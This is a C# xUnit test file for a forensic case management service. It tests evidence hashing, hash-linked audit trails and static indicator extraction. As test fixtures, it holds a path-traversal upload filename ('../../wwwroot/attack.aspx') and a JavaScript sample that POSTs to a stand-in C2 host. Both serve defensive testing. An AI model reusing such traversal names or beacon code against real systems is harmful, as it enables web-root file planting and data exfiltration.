using System.Security.Cryptography;
using System.Text;
using AtlasForense.Models;
using AtlasForense.Services;
using AtlasForense.Forensics;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.FileProviders;
using Xunit;

namespace AtlasForense.Tests;

public sealed class ForensicCaseServiceTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), $"atlas-forense-tests-{Guid.NewGuid():N}");
    private readonly JsonForensicCaseService _service;

    public ForensicCaseServiceTests()
    {
        Directory.CreateDirectory(_root);
        _service = new JsonForensicCaseService(new TestEnvironment(_root), [new StaticTextAnalyzer()]);
    }

    [Fact]
    public async Task CompleteWorkflow_EnforcesFourStagesAndSealsCase()
    {
        var item = await CreateCase();
        var authorization = await Authorize(item.Id);
        var acquisition = await Acquire(item.Id, "evidence.bin", "known forensic payload");
        var analysis = await _service.StartAnalysisAsync(item.Id, "Analyst A", default);
        var finding = await AddFinding(item.Id);
        var report = await PrepareReport(item.Id);
        var close = await _service.CloseAsync(item.Id, "Supervisor", default);

        Assert.All(new[] { authorization, acquisition, analysis, finding, report, close }, result => Assert.True(result.Success, result.Message));
        var completed = Assert.IsType<ForensicCase>(_service.Get(item.Id));
        Assert.Equal(CaseStatus.Closed, completed.Status);
        Assert.All(completed.Evidence, evidence => Assert.Equal(EvidenceStatus.Sealed, evidence.Status));
        Assert.False(string.IsNullOrWhiteSpace(completed.Report?.IntegrityHash));
    }

    [Fact]
    public async Task StageGates_RejectIncompleteOrOutOfOrderOperations()
    {
        var item = await CreateCase();
        Assert.False((await _service.StartAnalysisAsync(item.Id, "Analyst", default)).Success);
        Assert.False((await _service.CloseAsync(item.Id, "Supervisor", default)).Success);

        Assert.True((await Authorize(item.Id)).Success);
        Assert.False((await _service.StartAnalysisAsync(item.Id, "Analyst", default)).Success);

        Assert.True((await Acquire(item.Id, "disk.img", "payload")).Success);
        Assert.True((await _service.StartAnalysisAsync(item.Id, "Analyst", default)).Success);
        Assert.False((await PrepareReport(item.Id)).Success);
        Assert.False((await _service.CloseAsync(item.Id, "Supervisor", default)).Success);
    }

    [Fact]
    public async Task Acquisition_ComputesExpectedSha256AndPreservesExactBytes()
    {
        var bytes = Encoding.UTF8.GetBytes("NIST-known-test-vector-AtlasForense");
        var expected = Convert.ToHexString(SHA256.HashData(bytes)).ToLowerInvariant();
        var item = await CreateCase();
        await Authorize(item.Id);

        var result = await Acquire(item.Id, "source.dd", bytes);

        Assert.True(result.Success, result.Message);
        var evidence = Assert.Single(_service.Get(item.Id)!.Evidence);
        Assert.Equal(expected, evidence.Sha256);
        var storedPath = Path.Combine(_root, "App_Data", "Evidence", item.Id.ToString("N"), evidence.StoredFileName);
        Assert.Equal(bytes, await File.ReadAllBytesAsync(storedPath));
    }

    [Fact]
    public async Task Acquisition_StoresHostileFilenameOutsideWebRoot()
    {
        var item = await CreateCase();
        await Authorize(item.Id);

        var result = await Acquire(item.Id, "../../wwwroot/attack.aspx", "not executable here");

        Assert.True(result.Success, result.Message);
        var evidence = Assert.Single(_service.Get(item.Id)!.Evidence);
        Assert.DoesNotContain("..", evidence.StoredFileName);
        Assert.DoesNotContain('/', evidence.StoredFileName);
        Assert.Empty(Directory.EnumerateFiles(Path.Combine(_root, "wwwroot"), "*", SearchOption.AllDirectories));
        Assert.Single(Directory.EnumerateFiles(Path.Combine(_root, "App_Data", "Evidence"), "*", SearchOption.AllDirectories));
    }

    [Fact]
    public async Task ChainOfCustodyAndAuditTrail_AreOrderedAndHashLinked()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "memory.raw", "volatile data");
        var evidence = Assert.Single(_service.Get(item.Id)!.Evidence);

        var custody = await _service.AddCustodyAsync(new CustodyInput { CaseId = item.Id, EvidenceId = evidence.Id, Action = "Transferencia a bóveda", PerformedBy = "Custodian", Location = "Vault A", Notes = "Sello intacto" }, default);

        Assert.True(custody.Success, custody.Message);
        Assert.Equal(2, evidence.ChainOfCustody.Count);
        var audit = _service.Get(item.Id)!.AuditTrail;
        Assert.Equal(Enumerable.Range(1, audit.Count).Select(x => (long)x), audit.Select(x => x.Sequence));
        Assert.Equal("GENESIS", audit[0].PreviousHash);
        for (var index = 1; index < audit.Count; index++) Assert.Equal(audit[index - 1].EntryHash, audit[index].PreviousHash);
        Assert.Equal(audit.Count, audit.Select(x => x.EntryHash).Distinct().Count());
    }

    [Fact]
    public async Task Persistence_ReloadsCaseWithoutChangingEvidenceHashOrAudit()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "log.evtx", "event log bytes");
        var before = _service.Get(item.Id)!;

        var reloaded = new JsonForensicCaseService(new TestEnvironment(_root)).Get(item.Id);

        Assert.NotNull(reloaded);
        Assert.Equal(before.Evidence.Single().Sha256, reloaded!.Evidence.Single().Sha256);
        Assert.Equal(before.AuditTrail.Select(x => x.EntryHash), reloaded.AuditTrail.Select(x => x.EntryHash));
    }

    [Fact]
    public async Task ConcurrentCaseCreation_ProducesUniqueFoliosAndValidFiles()
    {
        var tasks = Enumerable.Range(1, 20).Select(index => _service.CreateAsync(new CreateCaseInput { Title = $"Case {index}", RequestingOrganization = "Lab", LeadExaminer = "Examiner", Scope = "Controlled concurrency test" }, default));
        var created = await Task.WhenAll(tasks);

        Assert.Equal(20, created.Select(x => x.Folio).Distinct().Count());
        var database = await File.ReadAllTextAsync(Path.Combine(_root, "App_Data", "cases.json"));
        Assert.Contains(created[0].Folio, database);
        Assert.Equal(20, _service.GetAll().Count);
    }

    [Fact]
    public async Task Acquisition_RejectsEmptyEvidenceFile()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        var result = await Acquire(item.Id, "empty.bin", Array.Empty<byte>());
        Assert.False(result.Success);
        Assert.Empty(_service.Get(item.Id)!.Evidence);
    }

    [Fact]
    public async Task StaticAnalysis_ExtractsIocsFunctionsAndCapabilitiesWithoutExecutingSample()
    {
        var script = "async function sendData(){ return fetch('https://c2.example.test/request/auth.php', {method:'POST'}); } localStorage.setItem('domain','c2.example.test');";
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "sample.js", script);
        await _service.StartAnalysisAsync(item.Id, "Analyst", default);
        var evidence = item.Evidence.Single();

        var result = await _service.AnalyzeEvidenceAsync(item.Id, evidence.Id, "Analyst", default);

        Assert.True(result.Success, result.Message);
        var analyzed = _service.Get(item.Id)!;
        var run = Assert.Single(analyzed.AnalysisRuns);
        Assert.True(run.NetworkBlocked);
        Assert.False(run.SampleExecuted);
        Assert.Contains(analyzed.Indicators, x => x.Type == IndicatorType.Url && x.Value.Contains("c2.example.test"));
        Assert.Contains(analyzed.Indicators, x => x.Type == IndicatorType.Domain && x.Value == "c2.example.test");
        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.ScriptFunction && x.Value == "sendData");
        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.Capability && x.Value == "Network request");
        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.Capability && x.Value == "Browser storage");
    }

    [Fact]
    public async Task StaticAnalysis_BlocksTamperedEvidenceAndAuditsIntegrityFailure()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "sample.js", "function clean() { return true; }");
        await _service.StartAnalysisAsync(item.Id, "Analyst", default);
        var evidence = item.Evidence.Single();
        var path = Path.Combine(_root, "App_Data", "Evidence", item.Id.ToString("N"), evidence.StoredFileName);
        await File.AppendAllTextAsync(path, "tampered");

        var result = await _service.AnalyzeEvidenceAsync(item.Id, evidence.Id, "Analyst", default);

        Assert.False(result.Success);
        Assert.Empty(item.AnalysisRuns);
        Assert.Contains(item.AuditTrail, x => x.Action == "INTEGRITY_FAILURE");
    }

    [Fact]
    public async Task MarkdownReport_ContainsEvidenceAnalysisFindingsAndVerifiableManifest()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "sample.js", "function beacon(){ fetch('https://evidence.example.test/api'); }");
        await _service.StartAnalysisAsync(item.Id, "Analyst", default);
        await _service.AnalyzeEvidenceAsync(item.Id, item.Evidence.Single().Id, "Analyst", default);
        await AddFinding(item.Id);
        await PrepareReport(item.Id);

        var document = new MarkdownForensicReportBuilder().BuildMarkdown(item);

        Assert.EndsWith("-informe-forense.md", document.FileName);
        Assert.Equal(64, document.Sha256.Length);
        Assert.Contains("## 4. Inventario y preservación de evidencia", document.Content);
        Assert.Contains(item.Evidence.Single().Sha256, document.Content);
        Assert.Contains("static-text-ioc", document.Content);
        Assert.Contains("https://evidence.example.test/api", document.Content);
        Assert.Contains("## 7. Hallazgos", document.Content);
        Assert.Contains("Cadena de auditoría: **VÁLIDA**", document.Content);
    }

    private Task<ForensicCase> CreateCase() => _service.CreateAsync(new CreateCaseInput { Title = "Validated case", RequestingOrganization = "Forensic Lab", LeadExaminer = "Examiner A", Scope = "Known test data only" }, default);
    private Task<OperationResult> Authorize(Guid id) => _service.AuthorizeAsync(new AuthorizeCaseInput { CaseId = id, Authority = "Test authority", Reference = "AUTH-001", ApprovedBy = "Supervisor", Limitations = "Laboratory validation" }, default);
    private Task<OperationResult> Acquire(Guid id, string name, string content) => Acquire(id, name, Encoding.UTF8.GetBytes(content));
    private Task<OperationResult> Acquire(Guid id, string name, byte[] content)
    {
        var stream = new MemoryStream(content);
        var file = new FormFile(stream, 0, content.Length, "File", name);
        return _service.AcquireAsync(new AcquireEvidenceInput { CaseId = id, Description = "Known evidence", SourceType = "Test fixture", SourceLocation = "Isolated lab", AcquiredBy = "Examiner A", AcquisitionMethod = "Controlled byte copy", File = file }, default);
    }
    private Task<OperationResult> AddFinding(Guid id) => _service.AddFindingAsync(new FindingInput { CaseId = id, Title = "Known indicator", Severity = FindingSeverity.High, Description = "Expected finding", TechnicalDetails = "Matched controlled fixture", EvidenceReferences = $"{_service.Get(id)!.Evidence.Single().Identifier}", Analyst = "Analyst A" }, default);
    private Task<OperationResult> PrepareReport(Guid id) => _service.PrepareReportAsync(new ReportInput { CaseId = id, ExecutiveSummary = "Controlled result", Methodology = "Known input compared with expected output", Conclusions = "Integrity preserved", Recommendations = "Retain validation record", PreparedBy = "Analyst A" }, default);

    public void Dispose()
    {
        if (Directory.Exists(_root)) Directory.Delete(_root, true);
    }

    private sealed class TestEnvironment : IWebHostEnvironment
    {
        public TestEnvironment(string root)
        {
            ContentRootPath = root;
            WebRootPath = Path.Combine(root, "wwwroot");
            Directory.CreateDirectory(WebRootPath);
            ContentRootFileProvider = new PhysicalFileProvider(ContentRootPath);
            WebRootFileProvider = new PhysicalFileProvider(WebRootPath);
        }
        public string ApplicationName { get; set; } = "AtlasForense.Tests";
        public IFileProvider WebRootFileProvider { get; set; }
        public string WebRootPath { get; set; }
        public string EnvironmentName { get; set; } = "Testing";
        public string ContentRootPath { get; set; }
        public IFileProvider ContentRootFileProvider { get; set; }
    }
}
